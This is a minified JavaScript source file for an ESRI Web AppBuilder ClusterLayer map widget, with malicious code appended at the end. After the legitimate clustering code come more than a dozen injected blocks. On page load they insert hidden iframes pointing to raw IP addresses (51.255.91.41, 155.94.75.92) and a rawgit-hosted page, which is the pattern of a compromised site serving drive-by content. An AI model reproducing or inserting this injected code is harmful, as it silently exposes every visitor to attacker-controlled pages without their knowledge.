// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/array dojo/_base/event dojo/_base/lang dojo/_base/Color dojo/_base/html dojo/DeferredList dojo/dom-class dojo/dom dojox/gfx/fx dojo/on dojo/Evented jimu/utils esri/layers/GraphicsLayer esri/graphic esri/geometry/Extent esri/geometry/Point esri/symbols/PictureMarkerSymbol esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/TextSymbol esri/symbols/Font esri/renderers/SimpleRenderer esri/tasks/query esri/tasks/QueryTask esri/symbols/jsonUtils esri/renderers/jsonUtils esri/layers/FeatureLayer".split(" "),
function(D,x,E,n,h,t,F,C,G,H,I,J,y,K,p,L,v,z,q,l,M,N,O,u,A,w,B,P){return D("ClusterLayer",[K,J],{constructor:function(a){this.clusterGraphics=[];this.cancelRequest=!1;this.clusterSize=120;this._singles=[];this._showSingles=!0;this.updateFeatures=void 0;this.hidePanel=a.hidePanel;this._parent=a._parent;if(this._parentLayer=a.parentLayer)this.objectIdField=this._parentLayer.objectIdField,this.fields=this._parentLayer.fields;this.name=a.name;this._map=a.map;this.color=h.fromString(a.color||"#ff0000");
this._styleColor=a._styleColor;this.symbolData=a.lyrInfo.symbolData;this.countColor=this.symbolData._highLightColor;this.itemId=a.lyrInfo.itemId;this.refresh=a.lyrInfo.refresh;this.displayFeatureCount=this.symbolData.displayFeatureCount;this.node=a.node;this.countEnabled=a.countEnabled;this.legendNode=a.legendNode;this.id=a.id;this.infoTemplate=a.infoTemplate;this.url=a.lyrInfo.url;this._testRenderer=a.lyrInfo.renderer;(this.originOperLayer=a.originOperLayer)&&this._getInfoTemplate(this.originOperLayer);
this.lyrInfo=a.lyrInfo;this.lyrType=a.lyrType;this.filter=a.filter;this.showAllFeatures=a.showAllFeatures;this.listDisabled=a.listDisabled;this.selfType=a.selfType;this._setupSymbols();this._setFieldNames();this.countFeatures(this._parentLayer);0<this._parentLayer.refreshInterval&&setInterval(n.hitch(this,this._updateEnd),6E4*this._parentLayer.refreshInterval)},countFeatures:function(a){var b=new u;b.geometry=this.showAllFeatures?a.fullExtent:this._map.extent;a.queryCount?a.queryCount(b,n.hitch(this,
function(b){if(0<b)this.hidePanel||(this.nodeCount=b),this._initFeatures(this._parentLayer);else if(!this.hidePanel){this.nodeCount=0;var c=new P(a.url);I(c,"load",n.hitch(this,function(){this.countFeatures(c)}))}})):this._initFeatures(this._parentLayer)},_initFeatures:function(a){this._features=[];var b=!0,c=new u;(-1<["CSV","Feature Collection","GeoRSS","KML"].indexOf(this.lyrType)||!this.url)&&a.graphics?(this._getSourceFeatures(a.graphics),this.clusterFeatures()):"undefined"!==typeof this.url?
this.loadData(this.url):(c.where=!this.showAllFeatures&&this.filter?this.filter:"1\x3d1",c.outFields=["*"],c.returnGeometry=!0,a.queryFeatures?a.queryFeatures(c).then(n.hitch(this,function(a){a.features&&(this._getSourceFeatures(a.features),this.clusterFeatures())})):b="error");"error"!==b&&(this.extentChangeSignal||(this.extentChangeSignal=this._map.on("extent-change",n.hitch(this,this.handleMapExtentChange))),this.clickSignal||(this.clickSignal=this.on("click",n.hitch(this,this.handleClick))))},
_getSourceFeatures:function(a){this._features=[];for(var b=0;b<a.length;b++){var c=a[b];c.geometry&&this._features.push(c)}},_getInfoTemplate:function(a){a=a.parentLayerInfo?a.parentLayerInfo:a;if(a.controlPopupInfo&&(a=a.controlPopupInfo.infoTemplates)){if(this.url){var b=this.url.split("/").pop();b&&(a.indexOf?-1<a.indexOf(b)&&(this.infoTemplate=a[b].infoTemplate):a.hasOwnProperty(b)&&(this.infoTemplate=a[b].infoTemplate))}this.setInfoTemplate(this.infoTemplate)}},_setFieldNames:function(){this._fieldNames=
[];if(this.infoTemplate&&"undefined"!==typeof this.infoTemplate.info){var a=this.infoTemplate.info.fieldInfos;if(a)for(var b=0;b<a.length;b++)a[b].visible&&this._fieldNames.push(a[b].fieldName)}if(this.symbolData.featureDisplayOptions&&0<this.symbolData.featureDisplayOptions.fields.length)for(a=0;a<this.symbolData.featureDisplayOptions.fields.length;a++)b=this.symbolData.featureDisplayOptions.fields[a],-1===this._fieldNames.indexOf(b.name)&&this._fieldNames.push(b.name);1>this._fieldNames.length&&
(this._fieldNames=["*"])},setLayerInfo:function(a){this.lyrInfo=a},clearSingles:function(a){x.forEach(a||this._singles,function(a){this.remove(a)},this);this._singles.length=0},_getSingleGraphic:function(a){a=new p(new v(a.geometry.x,a.geometry.y,this._map.spatialReference),null,a.attributes);a.setSymbol(this._singleSym);return a},_addSingles:function(a){x.forEach(a,function(a){a=this._getSingleGraphic(a);this._singles.push(a);this._showSingles&&this.add(a)},this);this._map.infoWindow.setFeatures(this._singles)},
initalCount:function(a){if(!this.hidePanel){var b=new u;b.returnGeometry=!1;b.geometry=this.showAllFeatures?null:this._map.extent;b.where=!this.showAllFeatures&&this.filter?this.filter:"1\x3d1";(new A(a)).executeForIds(b).then(n.hitch(this,function(a){var b;this.node?(C.contains(this.node,"searching")&&C.remove(this.node,"searching"),this.node.innerHTML=a?y.localizeNumber(a.length):0,b=this.node.parentNode):this.legendNode&&(b=this.legendNode.previousSibling);this.updateExpand(b,a?!1:!0)}))}},updateExpand:function(a,
b){if(!this.hidePanel&&"undefined"!==typeof a){var c;-1<a.id.indexOf("rec_")&&(c=a.id.replace("rec_",""),c=G.byId("exp_"+c));b?(a&&(t.addClass(a,"recDefault"),t.addClass(a,"inActive")),c&&t.addClass(c,"expandInActive")):this.visible&&(a&&(t.removeClass(a,"recDefault"),t.removeClass(a,"inActive")),c&&t.removeClass(c,"expandInActive"))}},loadData:function(a){if(0<a.length){this.initalCount(a);var b=new u;b.where="1\x3d1";!this.showAllFeatures&&this.filter&&(b.where=this.filter);b.returnGeometry=!1;
this.queryPending=!0;(new A(a)).executeForIds(b).then(n.hitch(this,function(b){if(b){this.queryIDs=b;b=[];var c,g;c=0;for(g=this.queryIDs.length;c<g;c+=1E3){var m=this.queryIDs.slice(c,c+1E3),e=new u;e.outFields=["*"];e.objectIds=m;e.returnGeometry=!0;e.outSpatialReference=this._map.spatialReference;m=new A(a);b.push(m.execute(e))}this._features=[];this.cancelRequest?console.log("Cancelled ClusterLayer 1"):(new F(b)).then(n.hitch(this,function(a){this.queryPending=!1;if(this.cancelRequest)console.log("Cancelled ClusterLayer 2");
else if(a){for(var b=this._map.spatialReference,c=[],d=0;d<a.length;d++)if(a[d][1].features)for(var e=0;e<a[d][1].features.length;e++){var f=a[d][1].features[e];if("undefined"!==typeof f.geometry&&null!==f.geometry&&f.geometry){var g=new v(f.geometry.x,f.geometry.y,b),g=new p(g);g.setAttributes(f.attributes);this.infoTemplate&&g.setInfoTemplate(this.infoTemplate);c.push(g)}}a=!0;1E4>c&&(a=JSON.stringify(this._features)!==JSON.stringify(c));a&&(this.requiresReload=!0,this._features=c,this.clusterFeatures(),
this.emit("update-end",{bubbles:!0,cancelable:!0}))}}))}}))}},handleClick:function(a){var b=[];if(a.graphic&&(b=a.graphic,b.attributes)){var c=b.attributes;c.Data&&1<c.Data.length?(this.clearSingles(this._singles),b=c.Data,a.stopPropagation(),this._addSingles(b)):c.Data&&1===c.Data.length?(c.Data[0].symbol=b.symbol,this._map.infoWindow.setFeatures([c.Data[0]])):this._map.infoWindow.setFeatures([b])}this.infoTemplate&&this._map.infoWindow.show(a.mapPoint);E.stop(a)},handleMapExtentChange:function(a){if(a.levelChange)this.clusterFeatures();
else if(a.delta){a=a.delta;var b=Math.abs(a.y);(50<Math.abs(a.x)||50<b)&&this.clusterFeatures()}},refreshFeatures:function(a){if(this.itemId){a=a.featureSet.features;"undefined"===typeof this.updateFeatures&&(this.updateFeatures=a);var b=!0;1E4>a.length&&(b=JSON.stringify(this.updateFeatures)!==JSON.stringify(a));if(b){this.requiresReload=!0;this._features=[];this._parentLayer.clear();var b=this._parentLayer.spatialReference,c;this._parentLayer.renderer?c=this._parentLayer.renderer:this._testRenderer&&
(c=this._testRenderer);for(var d=0;d<a.length;d++){var g=a[d];if(g.geometry){var m=new p(this.getGraphicOptions(g,b,c));m.setAttributes(g.attributes);this.infoTemplate&&m.setInfoTemplate(this.infoTemplate);m.setSymbol(c.getSymbol(m));this._parentLayer.add(m);this._features.push(m)}else console.log("Null geometry skipped")}this.clusterFeatures()}this.updateFeatures=a}else this.url&&this.loadData(this.url)},getGraphicOptions:function(a,b,c){return"undefined"!==typeof a.geometry.rings?{geometry:{rings:a.geometry.rings,
spatialReference:{wkid:b.wkid}}}:"undefined"!==typeof a.geometry.paths?{geometry:{paths:a.geometry.paths,spatialReference:{wkid:b.wkid}}}:"undefined"!==typeof a.geometry.points?{geometry:{points:a.geometry.points,spatialReference:{wkid:b.wkid}}}:{geometry:new v(a.geometry.x,a.geometry.y,a.geometry.spatialReference),symbol:c.symbol}},flashFeatures:function(){this._map.graphics.clear();this.flashGraphics(this.graphics)},flashSingle:function(a){if("undefined"===typeof a.symbol){var b=new l(l.STYLE_NULL,
new h(0,0,0,0),0),c=this.color.toRgb();a.setSymbol(new q(q.STYLE_CIRCLE,9,b,new h([c[0],c[1],c[2],.5])))}this.flashGraphics([a])},flashGraphics:function(a){for(var b=0;b<a.length;b++)this._flashFeature(a[b]);setTimeout(n.hitch(this,this._clearFeatures),1100)},_flashFeature:function(a){var b;if(a.geometry){var c=h.fromHex(this._styleColor),d=n.clone(c);d.a=.4;"undefined"!==typeof a.symbol&&(b=new q(q.STYLE_CIRCLE,a.symbol.size,new l(l.STYLE_SOLID,c,1),d))}"undefined"!==typeof b&&(a=new p(a.geometry,
b),this._map.graphics.add(a),b=a.getDojoShape())&&(H.animateStroke({shape:b,duration:700,color:{start:b.strokeStyle.color,end:b.strokeStyle.color},width:{start:18,end:0}}).play(),setTimeout(this._clearFeature,850,a))},_clearFeatures:function(){this._map.graphics.clear()},_clearFeature:function(a){a.getLayer().remove(a)},setColor:function(a){this.color=a},setStyleColor:function(a){this._styleColor=a},cancelPendingRequests:function(){console.log("Cancel Query...");this.queryPending&&(this.cancelRequest=
!0);this.removeEventListeners()},removeEventListeners:function(){this.extentChangeSignal&&(this.extentChangeSignal.remove(),this.extentChangeSignal=null);this.clickSignal&&(this.clickSignal.remove(),this.clickSignal=null)},clusterFeatures:function(){this.clear();null===this._map&&(this._map=this._parent.map);this._map.infoWindow.isShowing&&this._map.infoWindow.hide();var a=this._features,b=0;if("undefined"!==typeof a){if(0<a.length&&(this.visible||this.requiresReload)){var c=this.clusterSize;this.clusterGraphics=
[];for(var d=this._map.spatialReference,g=this._map.extent,m=new v(g.xmin,g.ymax,d),e=Math.ceil(this._map.height/c),f=Math.ceil(this._map.width/c),k=g.getWidth()/this._map.width*c,c=g.getHeight()/this._map.height*c,g=0;g<e;g++)for(var q=0;q<f;q++){var l=m.x+k*q,n=m.y-c*g,n=new L(l,n-c,l+k,n,d),l=[],h;for(h in a){var t=a[h];n.contains(t.geometry)&&(b+=1,l.push(t))}0<l.length&&(n=this.getClusterCenter(l),this.clusterGraphics.push({center:n,graphics:l}))}for(var u in this.clusterGraphics){d=this.clusterGraphics[u];
m=d.graphics.length;e=d.graphics;h=y.localizeNumber(m);k=f=19*h.length;f+=5;c=new N;c.family="Arial";c.size="16px";h=new M(h,c,this.countColor);h.setOffset(0,-4);var r;this.symbolData&&this.symbolData.symbol?this.symbolData.symbol.size?r=this.symbolData.symbol.size:this.symbolData.symbol.width&&(r=this.symbolData.symbol.width,c=this.symbolData.symbol.height,r=r>=c?r:c):this.icon.width?(f=this.icon.width>=f?this.icon.width+5:f,f=this.icon.height>=f?this.icon.height+5:f,k=this.icon.width>=k?this.icon.width+
1:k,k=this.icon.height>=k?this.icon.height+1:k):this.icon.size&&(r=this.icon.size);r&&(f=r>=f?r+5:f,k=r>=k?r+1:k);k>=f&&(f+=0===k-f?4:k-f+5);this._setSymbols(f+15,f);e={Count:m,Data:e};1<m?"undefined"!==typeof this.symbolData?"CustomSymbol"!==this.symbolData.symbolType?(this.add(new p(d.center,this.csym,e)),this.displayFeatureCount?this.add(new p(d.center,h,e)):this.add(new p(d.center,this.csym3,e))):(this.add(new p(d.center,this.csym,e)),this.displayFeatureCount?this.add(new p(d.center,h,e)):this.add(new p(d.center,
this.psym,e))):(this.add(new p(d.center,this.csym,e)),this.displayFeatureCount?this.add(new p(d.center,h,e)):this.add(new p(d.center,this.psym,e))):(d=d.graphics[0].geometry,this.renderer&&(this.renderer.hasOwnProperty("getSymbol")&&"LayerSymbol"===this.symbolData.symbolType?(d=new p(d,null,e.Data[0].attributes,this.infoTemplate),d.setSymbol(this.renderer.getSymbol(d))):this.renderer.hasOwnProperty("symbol")&&"LayerSymbol"===this.symbolData.symbolType?(d=new p(d,null,e.Data[0].attributes,this.infoTemplate),
d.setSymbol(w.fromJson(this.renderer.symbol))):d="EsriSymbol"===this.symbolData.symbolType?new p(d,w.fromJson(this.symbolData.symbol),e,this.infoTemplate):"LayerSymbol"!==this.symbolData.symbolType?new p(d,this.psym,e,this.infoTemplate):this.renderer.symbol?new p(d,this.renderer.symbol,e,this.infoTemplate):new p(d,this.psym,e,this.infoTemplate),"undefined"!==typeof d&&this.add(d)))}}this._updateNode(this.showAllFeatures?a.length:b)}},_getSym:function(a){var b;this.renderer.hasOwnProperty("getSymbol")&&
"LayerSymbol"===this.symbolData.symbolType?b=this.renderer.getSymbol(a):this.renderer.hasOwnProperty("symbol")&&"LayerSymbol"===this.symbolData.symbolType?b=this.renderer.symbol:"EsriSymbol"===this.symbolData.symbolType?b=this.symbolData.symbol:this.symbolData.symbol&&(b=this.symbolData.symbol);return b},_updateNode:function(a){if(!this.hidePanel){var b;this.node?(this.node.innerHTML=y.localizeNumber(a?a:0),b=this.node.parentNode):this.legendNode&&(b=this.legendNode.previousSibling);this.updateExpand(b,
a&&0<a&&this.visible?!1:!0)}},_updatePanelTime:function(a){if(!this.hidePanel){this.pageTitle.innerHTML="\x3cdiv\x3e\x3c/div\x3e";var b="";""!==this.config.mainPanelText&&(b=this.config.mainPanelText+" ");this.pageTitle.innerHTML=b+(new Date(a)).toLocaleDateString(navigator.language,{month:"2-digit",day:"2-digit",year:"numeric",hour:"numeric",minute:"2-digit",hour12:!0})}},_setSymbols:function(a,b){var c=this.color.toRgb(),d,g,m;if("undefined"!==typeof this.symbolData){var e;"custom"===this.backgroundClusterSymbol?
e=c:(d=w.fromJson(this.backgroundClusterSymbol),0===d.outline.color.a||0===d.outline.width?(g=l.STYLE_NULL,m=0):(g=l.STYLE_SOLID,m=d.outline.width));d?(c=l(g,d.outline.color,m),e=d.color.toRgb(),this.csym=new q(q.STYLE_CIRCLE,a,c,new h([e[0],e[1],e[2],.75]))):this.csym=new q(q.STYLE_CIRCLE,a,null,new h([e[0],e[1],e[2],.75]));(a=this.symbolData.s)&&-1<a.indexOf("${appPath}")?(a=window.location.pathname.replace("index.html",""),a=this.symbolData.s.replace("${appPath}",window.location.origin+a)):a=this.symbolData.s?
this.symbolData.s:this.icon.imageData;if(a&&"CustomIcon"===this.symbolData.iconType){var f,k;this.symbolData.symbol&&this.symbolData.symbol.height&&(f=this.symbolData.symbol.height);this.symbolData.symbol&&this.symbolData.symbol.width&&(k=this.symbolData.symbol.width);f&&k?k=f=k>f?k:f:(f=this.symbolData.icon.height?this.symbolData.icon.height:b,k=this.symbolData.icon.width?this.symbolData.icon.width:b);this.psym=new z(a,f,k)}else a&&"LayerIcon"===this.symbolData.iconType?this.psym=w.fromJson(this.symbolData.symbol):
"esriPMS"===this.icon.type?this.psym=this.icon:(b=l(this.icon.outline.style,this.icon.outline.color,this.icon.outline.width),this.psym=new q(this.icon.style,this.icon.size,b,this.icon.color));this.csym2=n.clone(this.psym);this.csym3=n.clone(this.csym2);"undefined"!==typeof this.csym2.xoffset&&(this.csym3.xoffset=0);"undefined"!==typeof this.csym2.yoffset&&(this.csym3.yoffset=0)}else f=new l(l.STYLE_NULL,new h(0,0,0,0),0),this.csym=new q(q.STYLE_CIRCLE,a,f,new h([c[0],c[1],c[2],.5])),this.psym=new z(this.icon.url,
a-10,a-10),this.psym2=new z(this.icon.url,b-7,b-7),f=new l(l.STYLE_NULL,new h(0,0,0,0),0),this.csym2=new q(q.STYLE_CIRCLE,b,f,new h([c[0],c[1],c[2],.5]))},_setupSymbols:function(){if("undefined"!==typeof this.symbolData){this.countColor=this.symbolData._highLightColor;this.backgroundClusterSymbol=this.symbolData.clusterSymbol;this.icon=this.symbolData.icon;"LayerSymbol"===this.symbolData.symbolType?this._parentLayer.renderer?this.renderer=this._parentLayer.renderer.toJson?this._parentLayer.renderer:
B.fromJson(this._parentLayer.renderer):this._testRenderer?this.renderer=B.fromJson(this._testRenderer):this.symbolData.renderer&&(this.renderer=this.symbolData.renderer.toJson?this.symbolData.renderer:B.fromJson(this.symbolData.renderer)):this.renderer=new O(w.fromJson(this.symbolData.symbol));var a=this.color.toRgb(),b=new l(l.STYLE_NULL,new h(0,0,0,0),0);this._singleSym=new q(q.STYLE_CIRCLE,9,b,new h([a[0],a[1],a[2],.5]))}},getLayer:function(){return this},getClusterCenter:function(a){var b=0,c=
0,d=a.length;x.forEach(a,function(a){b+=a.geometry.x;c+=a.geometry.y},this);return new v(b/d,c/d,a[0].geometry.spatialReference)},destroy:function(){this._clear();this.removeEventListeners()},_clear:function(){this.clear();this._features=[]},_updateEnd:function(){this.url&&this.loadData(this.url)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});